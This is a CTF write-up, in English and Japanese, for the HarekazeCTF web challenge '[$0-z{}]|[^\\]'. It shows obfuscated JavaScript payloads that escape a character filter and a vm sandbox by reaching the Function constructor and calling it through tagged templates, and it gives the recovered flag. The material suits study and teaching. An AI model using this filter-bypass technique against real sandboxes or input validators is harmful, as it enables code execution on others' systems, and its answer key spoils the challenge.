# [Web 150] `[$0-z{}]|[^\\]`

[(URL)](server/)

## Attachments

- [app.js](attachments/app.js)

## Intended Solution (en)
Get non-enumerable property names of `secret` with `Object.getOwnPropertyNames`.

```javascript
// return Object.getOwnPropertyNames(secret)
[][`constructo`[`concat`]`r`][`constructo`[`concat`]`r`][`call`]`${String[`fromCharCode`][`call`]`${114}${101}${116}${117}${114}${110}${32}${79}${98}${106}${101}${99}${116}${46}${103}${101}${116}${79}${119}${110}${80}${114}${111}${112}${101}${114}${116}${121}${78}${97}${109}${101}${115}${40}${115}${101}${99}${114}${101}${116}${41}`}``` // => hint,th1s-1s-th3-s3cr37-pr0p3rty
```

Then, get `secret['th1s-1s-th3-s3cr37-pr0p3rty']`.

```javascript
secret[[][`constructo`[`concat`]`r`][`constructo`[`concat`]`r`][`call`]`${String[`fromCharCode`][`call`]`${114}${101}${116}${117}${114}${110}${32}${79}${98}${106}${101}${99}${116}${46}${103}${101}${116}${79}${119}${110}${80}${114}${111}${112}${101}${114}${116}${121}${78}${97}${109}${101}${115}${40}${115}${101}${99}${114}${101}${116}${41}`}```[1]] // => flag{c411_funct10ns_w1th0ut_p4r3nth3s1s!}
```

## Intended Solution (ja)
`app.js` について調べる。どうやら `[$0-z{}]|[^\\]` の範囲内で JavaScript のコードを実行できるようだが、`vm.runInNewContext` によってコンテキストが操作されている。コンテキストには同じフォルダの `secret.js` から読み込んだ内容が設定されているが、これがどのようなメンバを持っているかは分からない。

`this` のメンバを調べたいが、`Object.keys` は `()` が禁止されているため直接呼ぶことはできない。したがって別の方法で関数呼び出しを行う必要があるが、今回は ES2015 で追加された Template Literal を利用する。そのために、まず Template Literal のタグ式にはどのような引数が渡るか調べてみる。

```javascript
function f(a, b, c) {
  console.log(a, b, c);
}
f`${1}hoge${'fuga'}` // => (3) ["", "hoge", "", raw: Array(3)] 1 "fuga"
```

第 1 引数に文字列の配列、第 2 引数以降に `${}` の中の式が評価された値が格納されている。

このため、`eval` か `setTimeout` をそのままタグ式にすると `eval((文字列の配列))` というように呼び出される。だが、`Function.prototype.call` を介すとタグ式に渡される第 1 引数は `this` の束縛に使われるため、`${}` の中の式を評価した値が `eval` の第 1 引数として使われる。

これを利用して、`Function` をタグ式として `${}` の中でコードを生成することで、フィルターを回避して任意のコードが実行できるようにする。

ただ `Function` は禁止されているため、なんとかして手に入れる必要がある。今回は適当なオブジェクトのコンストラクタ関数を `constructor` プロパティから取得し、さらにそのコンストラクタ関数を取得するという方法をとる。

`constructor` も禁止されているが、これは `String.prototype.concat` を使って回避する。

```javascript
[][`constructo`[`concat`]`r`][`constructo`[`concat`]`r`] // => function Function() { [native code] }
```

コードの生成部分には `String.fromCharCode` を用いる。`.` が禁止されているが、これは `[]` を使うことで回避できる。今後何度も使うので、簡単に任意の文字列を作れる関数を書く。

```javascript
function encode(s) {
  s = s.split('').map(c => c.charCodeAt(0)).join('}${');
  return "`${String[`fromCharCode`][`call`]`${" + s + "}`}`";
}
```

以下のコード (`Object.keys(this)` を実行する) で `this` のメンバを調べてみよう。

```javascript
// return Object.keys(this)
[][`constructo`[`concat`]`r`][`constructo`[`concat`]`r`][`call`]`${String[`fromCharCode`][`call`]`${114}${101}${116}${117}${114}${110}${32}${79}${98}${106}${101}${99}${116}${46}${107}${101}${121}${115}${40}${116}${104}${105}${115}${41}`}``` // => secret
```

`secret` という変数があることが分かった。以下のコード (`Object.keys(secret)` を実行する) で `secret` のメンバを調べてみよう。

```javascript
// return Object.keys(secret)
[][`constructo`[`concat`]`r`][`constructo`[`concat`]`r`][`call`]`${String[`fromCharCode`][`call`]`${114}${101}${116}${117}${114}${110}${32}${79}${98}${106}${101}${99}${116}${46}${107}${101}${121}${115}${40}${115}${101}${99}${114}${101}${116}${41}`}``` // => hint
```

`hint` というプロパティが存在することが分かった。内容を見てみよう。

```javascript
secret[`hint`] // -> `secret` has one more property
```

どうやら `hint` 以外にもプロパティが存在するらしい。`Object.keys` は enumerable なプロパティしか列挙してくれないので、`Object.getOwnPropertyNames` でもう一度 `secret` のメンバを調べてみよう。

```javascript
// return Object.getOwnPropertyNames(secret)
[][`constructo`[`concat`]`r`][`constructo`[`concat`]`r`][`call`]`${String[`fromCharCode`][`call`]`${114}${101}${116}${117}${114}${110}${32}${79}${98}${106}${101}${99}${116}${46}${103}${101}${116}${79}${119}${110}${80}${114}${111}${112}${101}${114}${116}${121}${78}${97}${109}${101}${115}${40}${115}${101}${99}${114}${101}${116}${41}`}``` // => hint,th1s-1s-th3-s3cr37-pr0p3rty
```

`th1s-1s-th3-s3cr37-pr0p3rty` というプロパティが存在することが分かった。内容を見てみよう。

```javascript
// return Object.getOwnPropertyNames(secret)
secret[[][`constructo`[`concat`]`r`][`constructo`[`concat`]`r`][`call`]`${String[`fromCharCode`][`call`]`${114}${101}${116}${117}${114}${110}${32}${79}${98}${106}${101}${99}${116}${46}${103}${101}${116}${79}${119}${110}${80}${114}${111}${112}${101}${114}${116}${121}${78}${97}${109}${101}${115}${40}${115}${101}${99}${114}${101}${116}${41}`}```[1]] // => flag{c411_funct10ns_w1th0ut_p4r3nth3s1s!}
```

フラグが得られた。

## Flag
```
HarekazeCTF{c411_funct10ns_w1th0ut_p4r3nth3s1s!}
```